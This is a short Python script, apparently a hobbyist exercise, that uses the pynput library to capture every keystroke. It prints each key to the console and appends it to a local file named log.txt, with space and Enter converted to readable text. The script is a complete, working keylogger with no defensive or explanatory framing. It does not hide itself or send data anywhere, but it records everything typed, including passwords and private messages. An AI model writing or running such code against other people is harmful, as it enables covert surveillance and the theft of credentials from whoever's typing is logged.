from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
   # letter = letter.replace("")
    print("The key entered :",letter)

    if letter == 'Key.space':
        letter = ' '
    if letter == "Key.enter":
        letter = "\n"

    with open("log.txt", 'a') as f:                         #file operations
        f.write("the letter pressed:")
        f.write(letter)
        f.write("\n")

# Collecting events until stopped

with Listener(on_press=write_to_file) as l:
    l.join()

